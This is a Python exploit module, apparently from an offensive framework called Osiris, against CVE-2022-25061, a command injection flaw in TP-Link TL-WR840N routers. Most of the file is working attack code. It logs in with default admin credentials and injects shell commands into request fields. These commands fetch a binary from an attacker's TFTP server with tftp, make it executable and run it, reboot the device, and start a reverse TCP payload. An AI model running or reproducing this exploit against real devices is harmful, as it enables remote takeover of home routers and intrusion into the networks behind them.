#!/usr/bin/env python3
# Project: Osiris-Framework
# Version 1.337
import requests

from core.ModuleObtainer import obtainer
from core.Processor import processor
from core.generator.Generator import generator
from core.generator.Ofuscator import ofuscator
from utilities.Tools import tools
from requests import post
from utilities.Messages import print_message

print_message.name_module = __file__

info = {
    'author': 'Samir Sanchez Garnica and Luis Jacome Valencia',
    'date': '12/10/2021',
    'rank': 'Excellent',
    'category': 'Exploit',
    'path': 'exploits/linux/misc/tplink/tl_wr840n/os_command_injection_cve_2022_25061.py',
    'license': 'GPL-2.0',
    'description': 'This vulnerability is discovered under the libcmm.so library, which processes parameters that are sent from the web server. '
                   'Although these parameters are validated only under a size of 16 bytes for the __ifName argument, at the character level there is no validation filter for escapable characters, '
                   'which allows the injection of commands under the object called oal_setIp6DefaultRoute.',
    'references': ['https://exploitwriter.io/2022/02/25/os-command-injection-in-tplink-tl-wr840n-cve-2022-25061/','https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25061']
}

options = {
    'target': ['Yes', 'set target to attack', ''],
    'platform': ['Yes', 'set id target to attack', '0'],
    'srvhost': ['Yes', 'Sets the TFTP server with the binary to be injected', ''],
    'srvfile': ['Yes', 'Sets the file name to inject ', ''],
    'payload': ['Yes', 'Set payload attack software', 'cmd/generic/reverse_tcp'],
    'username': ['Yes', 'Sets the username for authentication', 'admin'],
    'password': ['Yes', 'Sets the password for authentication', 'admin']
}

extra_info = {
    'cve': ['CVE-2022-25061'],
    'targets': ['GNU/Linux']
}

required = {
    'start_required': 'True',
    'check_required': 'False'
}


def exploit():
    try:
        print_message.start_execution()
        __target = tools.http_or_https(obtainer.options['target'][2])
        __session = requests.Session()

        if __target['code'] == 200:
            __headers = {
                'Host': obtainer.options['target'][2].split("//")[1].split('/')[0],
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:95.0) Gecko/20100101 Firefox/95.0',
                'Accept': '*/*',
                'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'text/plain',
                'Content-Length': 'str(len(self.payload))',
                'Origin': obtainer.options['target'][2],
                'Referer': obtainer.options['target'][2] + '/mainFrame.htm',
            }

            __cookies = {'Authorization': 'Basic ' + ofuscator.base64_encode(obtainer.options['username'][2] + ":" + obtainer.options['password'][2])['message']}

            __url = obtainer.options['target'][2] + "/cgi?2"
            processor.multi_handler(payload_options=obtainer.options_payload,
                                    exploit_options=obtainer.options)

            __stage_1 = ";tftp -g -r {} -l /var/tmp/dconf/{} {}".format(obtainer.options['srvfile'][2], obtainer.options['srvfile'][2], obtainer.options['srvhost'][2])
            __stage_2 = ";chmod +x /var/tmp/dconf/{}".format(obtainer.options['srvfile'][2])
            __stage_3 = ";./var/tmp/dconf/{}".format(obtainer.options['srvfile'][2])

            __stages = [
                '[NOIP_DNS_CFG#0,0,0,0,0,0#0,0,0,0,0,0]0,5\r\nenable=1\r\nuserName={0}\r\npassword={1}\r\nuserDomain={2}\r\nlogin=1\r\n'.format(__stage_1, __stage_2, __stage_3),
                '[L3_IP6_FORWARDING#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\n__ifAliasName=ewan_ipoev6_d\r\n__ifName=;reboot;\r\ndefaultConnectionService=\r\n',
                '[L3_IP6_FORWARDING#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\n__ifAliasName=ewan_ipoev6_d\r\n__ifName=;sh */t*/d*/n*;\r\ndefaultConnectionService=\r\n'
            ]

            print_message.execution_info("Sending  Stage: {}".format(__stages[0].replace('\r', '').replace('\n', ' ')))
            __response = __session.post(__url, headers=__headers, cookies=__cookies,
                                        data=__stages[0], timeout=5)

            if __response.status_code == 200:
                try:
                    print_message.execution_info("Sending  Stage: {}".format(__stages[1].replace('\r', '').replace('\n', ' ')))
                    __response = __session.post(__url, headers=__headers, cookies=__cookies,
                                                data=__stages[1], timeout=5)
                except Exception as Error:
                    print_message.execution_info("The device has been rebooted, please reconnect and press enter to invoke the payload.")
                    input("")
                    print_message.execution_info("Sending  Stage: {}".format(__stages[2].replace('\r', '').replace('\n', ' ')))
                    __response = __session.post(__url, headers=__headers, cookies=__cookies,
                                                data=__stages[2], timeout=5)

                    if __response.status_code == 200:
                        print_message.execution_info("complete chain of operation")

            print_message.end_execution()

        else:
            print_message.execution_error("The URL must be in the format http:// or https://")
            return False

    except Exception as Error:
        pass


def check():
    pass